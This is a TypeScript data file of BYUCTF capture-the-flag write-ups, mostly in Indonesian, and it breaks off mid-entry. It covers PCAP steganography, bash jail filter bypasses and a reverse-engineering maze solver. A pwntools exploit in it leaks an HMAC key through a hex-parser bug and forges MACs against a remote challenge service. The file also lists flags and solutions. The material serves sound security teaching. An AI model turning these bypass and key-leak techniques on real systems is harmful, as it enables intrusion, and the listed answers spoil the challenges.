import type { WriteUp } from '../types';

// BYUCTF — 9 writeups
export const byuctfWriteups: WriteUp[] = [
  {
    "id": "byuctf-foren-allrighttimeparadox",
    "title": "Alright. Time Paradox",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Writeup for challenge Alright. Time Paradox",
    "problemDescription": "",
    "tools": [],
    "analysis": "Diberikan sebuah file PCAP bernama `chall.pcapng` dan deskripsi yang memberikan petunjuk \"What protocol is associated with time?\". Protokol yang paling sering dikaitkan dengan waktu dalam jaringan adalah Network Time Protocol (NTP).",
    "solution": [
      {
        "title": "Investigasi Jaringan (Network Forensics)",
        "content": "1. **Filtering Trafik NTP:**\n   Menggunakan `tshark` atau Wireshark, filter diterapkan untuk hanya menampilkan paket yang menggunakan protokol NTP:\n   \n   Terdapat beberapa paket NTP yang dikirimkan dari alamat `192.168.132.1` ke `192.168.132.133`.\n\n2. **Analisis Payload:**\n   Karena NTP mengirimkan timestamp, data tersebut mungkin dimodifikasi untuk menyembunyikan informasi. Payload UDP dari paket-paket NTP tersebut diekstrak untuk dianalisis lebih lanjut:\n   \n\n   Hasil ekstraksi payload UDP dari paket pertama menunjukkan pola hexadecimal seperti berikut:\n   `23020a0000000000000000007f0000016553f162000000006553f179000000006553f175000000006553f16300000000`\n\n   Dapat dilihat bahwa pada bagian akhir payload (area yang biasanya digunakan untuk transmit/receive timestamps pada NTP), terdapat pola yang berulang: `6553f1XX00000000`.\n\n3. **Ekstraksi Flag:**\n   Byte `XX` pada pola tersebut berubah pada setiap blok. Jika dikonversi dari Hexadecimal ke ASCII, kita akan mendapatkan:\n   - `62` -> 'b'\n   - `79` -> 'y'\n   - `75` -> 'u'\n   - `63` -> 'c'\n\n   Pola ini menunjukkan karakter pembuka format flag yaitu `byuc`.\n\n   Untuk mengekstrak seluruh flag, dilakukan pembacaan dari setiap blok berulang dalam paket-paket NTP. Total ada 10 paket NTP yang masing-masing membawa 4 karakter tersembunyi (pada paket terakhir hanya 1 karakter yang valid, sisanya null byte/`00`).",
        "code": "tshark -r chall.pcapng -Y \"ntp\""
      },
      {
        "title": "Solusi (Automasi Script)",
        "content": "Dibuat sebuah script `solve.py` menggunakan Python untuk mengotomatisasi ekstraksi paket NTP dan melakukan parsing terhadap karakter yang disembunyikan tersebut.",
        "code": "import subprocess\n\ndef main():\n    cmd = ['tshark', '-r', 'chall.pcapng', '-Y', 'ntp', '-T', 'fields', '-e', 'udp.payload']\n    output = subprocess.check_output(cmd).decode('utf-8').splitlines()\n    flag = \"\"\n    for line in output:\n        payload = line.strip()\n        if not payload:\n            continue\n        parts = payload.split(\"6553f1\")\n        for part in parts[1:]:\n            byte_hex = part[:2]\n            if byte_hex != \"00\":\n                flag += chr(int(byte_hex, 16))\n    print(flag)\n\nif __name__ == '__main__':\n    main()"
      },
      {
        "title": "Hasil",
        "content": "Setelah menggabungkan semua karakter dari pola payload tersebut, didapatkan string flag penuh.\n\n**Flag:** `byuctf{S0_My_P4r4d0x_!d34_D!dnt_W0rk}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import subprocess\r\nimport binascii\r\n\r\ndef main():\r\n    cmd = ['tshark', '-r', 'chall.pcapng', '-Y', 'ntp', '-T', 'fields', '-e', 'udp.payload']\r\n    output = subprocess.check_output(cmd).decode('utf-8').splitlines()\r\n    flag = \"\"\r\n    for line in output:\r\n        payload = line.strip()\r\n        if not payload:\r\n            continue\r\n        # NTP payload is usually 48 bytes\r\n        # Look at the last 4 blocks of 8 bytes (4 * 8 = 32 bytes)\r\n        # Actually it's 4 blocks of 6553f1XX00000000\r\n        # The first 16 bytes are 23020a0000000000000000007f000001\r\n        # Then we have 4 groups of 8 bytes: 6553f1 62 00000000\r\n        # Let's just find the byte right after 6553f1\r\n        parts = payload.split(\"6553f1\")\r\n        for part in parts[1:]:\r\n            byte_hex = part[:2]\r\n            if byte_hex != \"00\":\r\n                flag += chr(int(byte_hex, 16))\r\n    print(flag)\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "byuctf{S0_My_P4r4d0x_!d34_D!dnt_W0rk}",
    "lessonsLearned": ""
  },
  {
    "id": "byuctf-foren-areustillhere",
    "title": ": Are You Still There?",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Writeup for challenge : Are You Still There?",
    "problemDescription": "",
    "tools": [],
    "analysis": "Pada challenge \"Are You Still There?\", kita diberikan sebuah file PCAPNG dengan hint di dalam deskripsinya: *\"how would you remotely check if a server is online?\"*.\nDari hint tersebut, sangat jelas bahwa metode yang umum digunakan untuk mengecek apakah sebuah server sedang online adalah dengan menggunakan perintah `ping`, yang mana memanfaatkan protokol jaringan ICMP (Internet Control Message Protocol).",
    "solution": [
      {
        "title": "Ekstraksi Data",
        "content": "Berbekal informasi tersebut, saya menggunakan tool `tshark` untuk melakukan filter pada paket-paket dengan protokol `icmp`. Saya mengambil payload data dari paket-paket tersebut dengan command:\n\n\nHasil dari command tersebut menampilkan urutan byte dalam format heksadesimal yang berulang (karena tiap pasang mewakili request dan reply):",
        "code": "tshark -r chall.pcapng -Y \"icmp\" -T fields -e data"
      },
      {
        "title": "Decoding",
        "content": "Langkah terakhir adalah melakukan decoding heksadesimal tersebut kembali menjadi karakter ASCII.\nTiap baris dapat diterjemahkan menjadi bagian dari teks:\n- 62797563 -> byuc\n- 74667b54 -> tf{T\n- 75727233 -> urr3\n- 745f5233 -> t_R3\n- 64336d70 -> d3mp\n- 7421306e -> t!0n\n- 5f4c216e -> _L!n\n- 33735f34 -> 3s_4\n- 72335f4e -> r3_N\n- 30745f52 -> 0t_R\n- 21643373 -> !d3s\n- 7d       -> }\n\nSetelah semua pecahan dirangkai, kita akan mendapatkan string flag secara utuh.\n\n**Flag:** `byuctf{Turr3t_R3d3mpt!0n_L!n3s_4r3_N0t_R!d3s}`"
      }
    ],
    "terminalOutputs": [],
    "flag": "byuctf{Turr3t_R3d3mpt!0n_L!n3s_4r3_N0t_R!d3s}",
    "lessonsLearned": ""
  },
  {
    "id": "byuctf-foren-corruptedcores",
    "title": ": Corrupted Cores",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Writeup for challenge : Corrupted Cores",
    "problemDescription": "",
    "tools": [],
    "analysis": "Pertama, kita cek protokol apa saja yang ada di dalam file `chall.pcapng` menggunakan `tshark`:\n\nBerdasarkan *protocol hierarchy*, terdapat trafik berupa ARP, NTP (UDP), ICMP, dan HTTP (TCP). Mengikuti petunjuk bahwa ARP bukanlah bagian dari tantangan, kita fokus menganalisis tiga protokol yang tersisa.\n\nDari hasil eksplorasi, kita dapat menemukan beberapa flag yang tersebar:\n1. **HTTP/TCP**: Melalui proses *follow tcp stream* untuk trafik HTTP JSON, kita menemukan sebuah *cookie* berisi data yang di-encode Base64. Saat di-decode, hasilnya adalah `byuctf{Th3_C4k3_!s_4_L!3_HTC56zeE}` yang sangat relevan dengan \"There will be cake\".\n2. **NTP**: Melakukan pengecekan *hex dump* pada *payload* NTP menunjukkan adanya karakter yang bila digabungkan membentuk flag `byuctf{S0_My_P4r4d0x_!d34_D!dnt_W0rk}`. Ini merupakan flag untuk challenge \"Alright. Paradox time\".\n3. **ICMP Payload**: Ketika mengecek *hex payload* dari paket *ICMP Echo Request*, kita dapat menemukan teks ASCII berupa `byuctf{Turr3t_R3d3mpt!0n_L!n3s_4r3_N0t_R!d3s}` yang merujuk pada \"Are you still there?\".\n\nLalu, di mana letak flag Corrupted Cores?",
    "solution": [
      {
        "title": "Challenge Deskripsi",
        "content": "Dalam challenge **Corrupted Cores**, kita diberikan file `chall.pcapng` yang menyimpan beberapa flag sekaligus. Dari deskripsi, kita tahu bahwa ada flag untuk 4 challenge berbeda yang berkaitan dengan game Portal:\n1. \"There will be cake\"\n2. \"Are you still there?\"\n3. \"Alright. Paradox time\"\n4. \"Corrupted Cores\"\n\nKita juga diberi dua buah hint:\n- *Hint 1: The voices may not belong to a single identity*\n- *Hint 2: The arp packets are not part of this challenge.*\n\nTugas kita adalah mencari flag spesifik untuk challenge **Corrupted Cores**."
      },
      {
        "title": "Solusi Otomatis",
        "content": "Sebuah script Python (`solve.py`) menggunakan `pyshark` telah dibuat untuk secara otomatis mengekstrak IP *Source* dari paket ICMP, mengonversinya menjadi ASCII, lalu mendecode string Base64 menjadi flag akhir."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import pyshark\r\nimport base64\r\nimport sys\r\n\r\ndef solve():\r\n    try:\r\n        # Filter only ICMP echo requests\r\n        cap = pyshark.FileCapture('chall.pcapng', display_filter='icmp.type==8')\r\n        b64_str = \"\"\r\n        \r\n        for pkt in cap:\r\n            if hasattr(pkt, 'ip'):\r\n                # Extract the source IP string\r\n                ip_src = pkt.ip.src\r\n                \r\n                # Convert each IP octet to an ASCII character\r\n                for octet in ip_src.split('.'):\r\n                    b64_str += chr(int(octet))\r\n                    \r\n        cap.close()\r\n        \r\n        # Decode the gathered base64 string\r\n        flag = base64.b64decode(b64_str).decode('utf-8').strip('\\x00')\r\n        print(f\"<FLAG>{flag}</FLAG>\")\r\n        \r\n    except Exception as e:\r\n        print(f\"Error occurred: {e}\", file=sys.stderr)\r\n\r\nif __name__ == '__main__':\r\n    solve()"
      }
    ],
    "terminalOutputs": [],
    "flag": "byuctf{Th3_P4rt_Wh3r3_H3_K!lls_Y0u}",
    "lessonsLearned": ""
  },
  {
    "id": "byuctf-foren-therewillbecake",
    "title": ": There Will Be Cake (BYUCTF)",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Writeup for challenge : There Will Be Cake (BYUCTF)",
    "problemDescription": "",
    "tools": [],
    "analysis": "Hint tersebut sangat jelas merujuk pada kata **\"Cookie\"**. Cookie bisa berarti kue kering, tapi di dunia IT, Cookie adalah data sesi yang disimpan oleh browser dari sebuah website.\n\nJadi, tujuan kita selanjutnya adalah ngecek *traffic* HTTP pada file PCAP buat nyari apakah ada *HTTP Cookie* yang disisipkan. \n\n1. **Mengekstrak traffic HTTP:**\n   Kita bisa pakai Wireshark atau command `tshark` di terminal buat memfilter traffic HTTP aja. \n   ```bash\n   tshark -r chall.pcapng -Y \"http\" -V\n   ```\n   Kalau kita perhatikan, pada paket ke-15 ada sebuah HTTP Request dengan metode `POST / HTTP/1.1`. Pas dicek bagian header-nya, ada parameter cookie unik yang dikirimkan klien:\n   `Cookie: cake=Ynl1Y3Rme1RoM19DNGszXyFzXzRfTCEzX0hUQzU2emVFfQ==`\n\n2. **Decoding Base64:**\n   Value dari cookie tersebut, yaitu `Ynl1Y3Rme1RoM19DNGszXyFzXzRfTCEzX0hUQzU2emVFfQ==` sangat ketara kalau itu adalah format encoding *Base64* (terlihat dari susunan karakternya dan adanya `==` sebagai padding di akhir string). Tinggal kita decode aja di terminal:\n   ```bash\n   echo \"Ynl1Y3Rme1RoM19DNGszXyFzXzRfTCEzX0hUQzU2emVFfQ==\" | base64 -d\n   ```\n   Hasil decode-nya langsung ngasih kita teks flag yang dicari:\n   `byuctf{Th3_C4k3_!s_4_L!3_HTC56zeE}`",
    "solution": [
      {
        "title": "Deskripsi Singkat",
        "content": "Challenge ini memberikan kita sebuah file PCAP (`chall.pcapng`) yang berisi rekaman traffic jaringan. Dari deskripsi soal, kita dikasih tahu bahwa file PCAP ini sebenarnya nyimpen 4 flag untuk 4 challenge yang berbeda:\n1. \"There will be cake\"\n2. \"Are you still there?\"\n3. \"Alright. Paradox time\"\n4. \"Corrupted Cores\"\n\nKarena fokus kita di challenge saat ini adalah **\"There Will Be Cake\"**, kita harus perhatiin baik-baik hint yang dikasih: \n> *\"what is a baked treat similar to a cake that you can find on almost any website?\"* (Apa camilan yang dipanggang mirip kue yang bisa kamu temukan di hampir semua website?)"
      },
      {
        "title": "Catatan Ekstra",
        "content": "Flag yang sebelumnya sempet didapat yaitu `byuctf{Th3_P4rt_Wh3r3_H3_K!lls_Y0u}` adalah flag yang salah untuk soal ini karena flag tersebut sebenernya milik challenge **\"Corrupted Cores\"** (flag itu disembunyikan di dalam *Source IP Address* yang di-spoofing pada paket-paket request ICMP).\n\nUntuk challenge **\"There Will Be Cake\"**, lokasinya 100% ada di dalem *HTTP Cookie*.\n\n**Flag:** `byuctf{Th3_C4k3_!s_4_L!3_HTC56zeE}`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import subprocess\r\nimport base64\r\nimport binascii\r\n\r\ndef get_flag_cake(pcap_file):\r\n    try:\r\n        cmd = [\"tshark\", \"-r\", pcap_file, \"-Y\", \"http\", \"-T\", \"fields\", \"-e\", \"http.cookie\"]\r\n        output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode().strip().split('\\n')\r\n        for line in output:\r\n            if 'cake=' in line:\r\n                b64_str = line.split('cake=')[1]\r\n                return base64.b64decode(b64_str).decode()\r\n    except Exception as e:\r\n        pass\r\n    return None\r\n\r\ndef get_flag_still_there(pcap_file):\r\n    try:\r\n        cmd = [\"tshark\", \"-r\", pcap_file, \"-Y\", \"icmp.type == 8\", \"-T\", \"fields\", \"-e\", \"data.data\"]\r\n        output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode().strip()\r\n        hex_data = output.replace('\\n', '')\r\n        if hex_data:\r\n            return binascii.unhexlify(hex_data).decode()\r\n    except Exception as e:\r\n        pass\r\n    return None\r\n\r\ndef get_flag_paradox(pcap_file):\r\n    try:\r\n        cmd = [\"tshark\", \"-r\", pcap_file, \"-Y\", \"ntp\", \"-T\", \"fields\", \"-e\", \"udp.payload\"]\r\n        output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode().strip().split('\\n')\r\n        flag = \"\"\r\n        for line in output:\r\n            if line:\r\n                payload_bytes = binascii.unhexlify(line)\r\n                # Karakter disembunyikan di LSB (Least Significant Byte) dari bagian integer setiap timestamp NTP\r\n                for idx in [19, 27, 35, 43]:\r\n                    if payload_bytes[idx] != 0:\r\n                        flag += chr(payload_bytes[idx])\r\n        return flag\r\n    except Exception as e:\r\n        pass\r\n    return None\r\n\r\ndef get_flag_corrupted(pcap_file):\r\n    try:\r\n        cmd = [\"tshark\", \"-r\", pcap_file, \"-Y\", \"icmp.type == 8\", \"-T\", \"fields\", \"-e\", \"ip.src\"]\r\n        output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode().strip().split('\\n')\r\n        b64_flag = \"\"\r\n        for ip in output:\r\n            if ip:\r\n                octets = ip.split('.')\r\n                for octet in octets:\r\n                    if int(octet) != 0:\r\n                        b64_flag += chr(int(octet))\r\n        \r\n        # Tambahkan padding jika kurang\r\n        b64_flag += \"=\" * ((4 - len(b64_flag) % 4) % 4)\r\n        return base64.b64decode(b64_flag).decode()\r\n    except Exception as e:\r\n        pass\r\n    return None\r\n\r\nif __name__ == \"__main__\":\r\n    pcap = \"chall.pcapng\"\r\n    print(f\"[*] Extracting flags from {pcap}...\\n\")\r\n    print(f\"[+] There Will Be Cake: {get_flag_cake(pcap)}\")\r\n    print(f\"[+] Are You Still There?: {get_flag_still_there(pcap)}\")\r\n    print(f\"[+] Alright. Paradox Time: {get_flag_paradox(pcap)}\")\r\n    print(f\"[+] Corrupted Cores: {get_flag_corrupted(pcap)}\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "byuctf{Th3_C4k3_!s_4_L!3_HTC56zeE}",
    "lessonsLearned": ""
  },
  {
    "id": "byuctf-misc-easy",
    "title": ": Easy Mode (Misc/Jail) - BYUCTF",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Writeup for challenge : Easy Mode (Misc/Jail) - BYUCTF",
    "problemDescription": "",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "Target memberikan akses ke sebuah shell Bash interaktif, namun dengan batasan yang sangat ketat:\n1.  **Space Removal**: Semua spasi yang diinputkan dihapus oleh sistem backend sebelum dieksekusi.\n2.  **Restricted PATH**: Perintah standar seperti `ls` atau `cat` tidak dapat ditemukan (kemungkinan `PATH` dikosongkan).\n3.  **Kata Terlarang**: Ada indikasi filter terhadap kata-kata tertentu (seperti `flag`), meskipun akhirnya bisa diatasi dengan wildcard.\n\nTujuan kita adalah membaca isi file `flag.txt` di direktori `/app`."
      },
      {
        "title": "1. Menemukan Masalah Utama",
        "content": "Saat mencoba perintah normal seperti `ls` atau `echo *`, sistem memberikan pesan error:\n- Input `ls` -> `bash: ls: command not found`\n- Input `echo *` -> `bash: echo*: command not found` (Spasi hilang dan menjadi satu string `echo*`)."
      },
      {
        "title": "2. Bypass Filter Spasi",
        "content": "Untuk menjalankan perintah dengan argumen tanpa karakter spasi, kita bisa menggunakan **Brace Expansion** di Bash. Format `{perintah,argumen}` akan dievaluasi oleh Bash sebagai `perintah argumen`.\n\nContoh penemuan file:\n```bash\n$ {echo,*}"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "byuctf-misc-skull",
    "title": ": Skull (Misc/Jail) - BYUCTF",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Writeup for challenge : Skull (Misc/Jail) - BYUCTF",
    "problemDescription": "",
    "tools": [],
    "analysis": "Mari kita bedah restriksi gila yang diterapkan pada shell ini:\n1. **Broken PATH:** `export PATH=\"/tmp\"` membuat kita tidak bisa memanggil command standar (seperti `ls`, `cat`) tanpa *absolute path*.\n2. **Filter Karakter Simbol:** Karakter penting seperti spasi, `.`, `*`, `$`, `=`, `<`, `>`, `&`, dan `;` diblokir mentah-mentah.\n3. **Filter Huruf Kecil:** `elif [[ \"$user_input\" =~ [[:lower:]] ]]` memastikan **semua huruf kecil (a-z)** akan ditolak.\n4. **Batas Panjang:** Input maksimal hanya 20 karakter.",
    "solution": [
      {
        "title": "Deskripsi Challenge",
        "content": "Pada challenge ini, kita diberikan koneksi netcat ke sebuah *restricted shell* bernama `sbash` (Safe Bourne Again Shell). Kita juga diberikan *source code* `jail.sh` yang menunjukkan bagaimana filter keamanan diterapkan. Tujuannya adalah menjalankan sebuah skrip lokal tak bernama untuk mendapatkan flag."
      },
      {
        "title": "Strategi Bypass",
        "content": "Karena kita harus mengeksekusi skrip di dalam direktori saat ini (yang namanya dirahasiakan dan kita tidak tahu panjangnya), kita punya masalah: kita tidak bisa memakai `.` (titik) untuk `./script`, tidak bisa pakai `*`, dan tidak bisa mengetik abjad kecil sama sekali.\n\nUntuk mengakalinya, kita bisa menggunakan kombinasi fitur ekspansi bawaan Bash:\n1. **Tilde Expansion (`~+`)**: Di dalam Bash, `~+` akan otomatis diekspansi menjadi variabel `$PWD` (direktori kerja saat ini). Ini mem-bypass kebutuhan mengetik *absolute path* dan huruf kecil.\n2. **Wildcard Tanda Tanya (`?`)**: Karena tanda bintang (`*`) diblokir, kita bisa menggunakan `?` yang berfungsi sebagai *wildcard* untuk satu karakter apa saja.\n\nDengan merangkai `~+/???...`, Bash akan mengekspansinya menjadi `/ctf/19xxxx/???...`. Jika jumlah tanda tanya cocok dengan panjang nama file *executable* di direktori tersebut, file itu akan langsung tereksekusi!"
      },
      {
        "title": "Eksekusi",
        "content": "Kita melakukan iterasi panjang karakter menggunakan tanda tanya di shell target.\n\n```bash\nsafe_bash> ~+/???\ncommand failed\nsafe_bash> ~+/????\ncommand failed\nsafe_bash> ~+/?????\ncommand failed\nsafe_bash> ~+/??????\ncommand failed\nsafe_bash> ~+/???????"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "byuctf-pwn-bytecoin",
    "title": "Bytecoin",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Challenge ini kelihatannya “crypto”, tapi akar masalahnya ada di parser input dan cara program memanfaatkan buffer hasil parsing.",
    "problemDescription": "Challenge ini kelihatannya “crypto”, tapi akar masalahnya ada di parser input dan cara program memanfaatkan buffer hasil parsing.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon singkat",
        "content": "Binary adalah ELF 64-bit PIE, NX aktif, canary aktif, dan tidak stripped. Karena symbol masih ada, analisis statik cukup enak.\n\nFungsi penting yang langsung kelihatan:\n\n- `main`\n- `bytecoin`\n- `scan_hex_array`\n- `crypto_memcmp`\n\nProgram mencetak ciphertext, Poly1305 tag, dan HMAC tag, lalu meminta tiga input untuk proses dekripsi."
      },
      {
        "title": "Bug utama",
        "content": "Masalah paling menarik ada di `scan_hex_array`.\n\nIntinya:\n\n1. Program mengalokasikan buffer sementara dengan ukuran `2 * (n + 1)`.\n2. `fgets` membaca string hex.\n3. Loop parsing menaikkan counter byte **sebelum** `sscanf` divalidasi.\n4. Kalau parsing gagal di satu posisi, fungsi tetap mengembalikan jumlah byte yang sudah “diproses”.\n\nDi `bytecoin`, nilai balik ini dipakai buat:\n\n- `memcpy` ke buffer plaintext/ciphertext\n- panjang yang masuk ke dekripsi\n\nJadi kita bisa bikin input hex yang valid sampai byte tertentu, lalu menyelipkan pasangan invalid seperti `zz`. Efeknya:\n\n- byte itu tidak di-overwrite\n- isi buffer sementara masih berisi data lama\n- data lama tersebut berasal dari `hmacKey`, karena buffer dipakai ulang dan diisi dari key HMAC sebelum parsing\n\nIni jadi primitive leak per byte."
      },
      {
        "title": "Leak key",
        "content": "Dengan teknik di atas, saya leak `hmacKey` 32 byte, satu byte per ronde.\n\nPayload yang dipakai:\n\n- `00` berulang sampai byte yang mau dilewati\n- lalu `zz` untuk memaksa parsing gagal di byte berikutnya\n\nKarena program tetap lanjut ke tahap dekripsi dan mencetak:\n\n`[+] Decrypting message ...`\n\nkita bisa ambil byte yang bocor dari output plaintext hasil dekripsi."
      },
      {
        "title": "Kenapa dekripsi bisa dipakai",
        "content": "Ada dua hal yang membantu:\n\n- IV untuk HMAC tidak ikut dihitung, jadi HMAC cuma cover ciphertext + Poly1305 tag.\n- Return value dari `wc_ChaCha20Poly1305_Decrypt` tidak dihentikan lebih awal.\n\nJadi setelah key HMAC bocor, kita bisa forge HMAC untuk ciphertext yang sudah kita ubah."
      },
      {
        "title": "Final exploit",
        "content": "Setelah `hmacKey` didapat:\n\n1. Ambil ciphertext asli.\n2. Flip satu byte pertama ciphertext supaya hasil plaintext berubah.\n3. Hitung ulang HMAC-SHA256 atas `ciphertext || poly1305_tag`.\n4. Kirim ciphertext, IV asli, Poly1305 tag asli, dan HMAC forged.\n5. Program mencetak plaintext hasil dekripsi.\n\nDi output final, plaintext yang keluar masih punya satu byte salah karena ciphertext tadi di-flip. Byte itu tinggal dibalik lagi secara lokal untuk recover flag."
      },
      {
        "title": "Hasil",
        "content": "Flag yang didapat dari service:\n\n`byuctf{crypt0_buffer_reuse_b4d}`"
      },
      {
        "title": "File",
        "content": "- [solve.py](./solve.py)"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nimport hashlib\r\nimport hmac\r\nimport re\r\nimport os\r\n\r\n\r\nHOST = \"chals.cyberjousting.com\"\r\nPORT = 1362\r\nORIG_IV = b\"303132333435363738396162\"  # b\"0123456789ab\".hex()\r\n\r\n\r\ndef get_round(io):\r\n    data = io.recvuntil(b\">>> Enter a ciphertext to decrypt:\")\r\n    text = data.decode(errors=\"ignore\")\r\n    ct = re.search(r\"Encrypted data: ([0-9a-f]+)\", text).group(1)\r\n    tag = re.search(r\"Poly1305 authentication tag: ([0-9a-f]+)\", text).group(1)\r\n    mac = re.search(r\"HMAC tag: ([0-9a-f]+)\", text).group(1)\r\n    return ct, tag, mac\r\n\r\n\r\ndef answer(io, ct, iv, tag, mac):\r\n    io.sendline(ct if isinstance(ct, bytes) else ct.encode())\r\n    io.recvuntil(b\">>> Enter an IV for the message:\")\r\n    io.sendline(iv if isinstance(iv, bytes) else iv.encode())\r\n    io.recvuntil(b\">>> Enter a Poly1305 authentication tag for the message:\")\r\n    io.sendline(tag if isinstance(tag, bytes) else tag.encode())\r\n    io.recvuntil(b\">>> Enter an HMAC tag for the message:\")\r\n    io.sendline(mac if isinstance(mac, bytes) else mac.encode())\r\n\r\n\r\ndef start():\r\n    if args.REMOTE:\r\n        return remote(HOST, PORT)\r\n    env = {\"LD_LIBRARY_PATH\": os.path.join(os.getcwd(), \"wolfssl-install/lib\")}\r\n    return process(\"./challenge\", env=env)\r\n\r\n\r\ndef main():\r\n    io = start()\r\n\r\n    leaked = bytearray()\r\n    for i in range(32):\r\n        _, tag, mac = get_round(io)\r\n        # scan_hex_array increments its byte count before sscanf validates.\r\n        # The invalid pair leaves tmp[i] unchanged, and tmp initially contains hmacKey.\r\n        answer(io, \"00\" * i + \"zz\", ORIG_IV, tag, mac)\r\n        out = io.recvuntil(b\"Invalid HMAC tag!\").decode(errors=\"ignore\")\r\n        msg = bytes.fromhex(re.search(r\"Decrypting message ([0-9a-f]+)\", out).group(1))\r\n        leaked.append(msg[-1])\r\n\r\n    ct, tag, _ = get_round(io)\r\n    forged_ct = bytearray.fromhex(ct)\r\n    forged_ct[0] ^= 1\r\n    forged_mac = hmac.new(leaked, bytes(forged_ct) + bytes.fromhex(tag), hashlib.sha256).hexdigest()\r\n\r\n    answer(io, forged_ct.hex(), ORIG_IV, tag, forged_mac)\r\n    out = io.recvall(timeout=3).decode(errors=\"ignore\")\r\n    msg_hex = re.search(r\"Here's your message:\\n([0-9a-f]+)\", out).group(1)\r\n    msg = bytearray.fromhex(msg_hex)\r\n    msg[0] ^= 1\r\n    flag = bytes(msg).rstrip(b\"\\x00\\r\\n\").decode(errors=\"ignore\")\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "byuctf{crypt0_buffer_reuse_b4d}",
    "lessonsLearned": ""
  },
  {
    "id": "byuctf-rev-angrmanagement",
    "title": "Angr Management",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "BYUCTF",
    "tags": [],
    "description": "Kategori: reverse engineering",
    "problemDescription": "Binary ini adalah maze berbasis control flow. Program selalu mencetak posisi saat ini dengan format `Arrived at N`, lalu membaca angka dari stdin. Kalau angka itu bukan salah satu edge yang valid dari node tersebut, program mencetak `That's not a valid destination` dan keluar.\n\nFile lokal berisi flag dummy:\n\n```text\nbyuctf{test_flag}\n```\n\nJadi targetnya bukan mengambil string dari binary lokal, tapi menemukan rute maze yang benar lalu mengirim rute itu ke service remote.",
    "tools": [],
    "analysis": "Proteksi binary:\n\n```text\nELF 64-bit PIE, not stripped\nFull RELRO, Canary, NX, PIE\n```\n\nSimbol masih tersedia, termasuk `main` dan `get_input`. Fungsi `get_input` memakai `fgets`, lalu `strtol`, sehingga input yang dibutuhkan hanya angka desimal per baris.\n\nDi `main`, tiap node punya pola seperti ini:\n\n```asm\nmov    esi, <node_id>\ncall   printf          ; \"Arrived at %d\"\ncall   get_input\ncmp    [rbp-0x4], <destination>\nje/jmp <block node tujuan>\n```\n\nSaya ekstrak semua blok `Arrived at N`, lalu membuat graf dari setiap `cmp input, X` menuju alamat blok target. Ada 624 node normal. Satu edge terakhir tidak menuju node normal, tetapi ke blok yang mencetak flag. Edge tersebut adalah dari node `329` dengan input `624`.\n\nRute dari node awal `0` ke blok flag:\n\n```text\n256 423 495 307 39 250 391 119 105 499 123 104 536 257 608 253 74 365 543 300 571 506 595 192 383 112 17 556 93 318 114 276 18 216 449 414 124 503 71 407 78 285 481 66 381 531 82 337 600 86 230 327 472 393 348 331 14 207 402 548 528 168 530 490 378 408 518 202 87 342 329 624\n```",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import context, remote\r\n\r\n\r\nHOST = \"chals.cyberjousting.com\"\r\nPORT = 1368\r\n\r\nPATH = [\r\n    256, 423, 495, 307, 39, 250, 391, 119, 105, 499, 123, 104,\r\n    536, 257, 608, 253, 74, 365, 543, 300, 571, 506, 595, 192,\r\n    383, 112, 17, 556, 93, 318, 114, 276, 18, 216, 449, 414,\r\n    124, 503, 71, 407, 78, 285, 481, 66, 381, 531, 82, 337,\r\n    600, 86, 230, 327, 472, 393, 348, 331, 14, 207, 402, 548,\r\n    528, 168, 530, 490, 378, 408, 518, 202, 87, 342, 329, 624,\r\n]\r\n\r\n\r\ndef main():\r\n    context.log_level = \"error\"\r\n\r\n    payload = (\"\\n\".join(map(str, PATH)) + \"\\n\").encode()\r\n    io = remote(HOST, PORT)\r\n    io.send(payload)\r\n\r\n    output = io.recvall(timeout=10).decode(errors=\"replace\")\r\n    print(output, end=\"\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "byuctf{g3t_w1th_th3_c0ntr01_fl0w}",
    "lessonsLearned": ""
  },
  {
    "id": "byuctf-rev-pickerick",
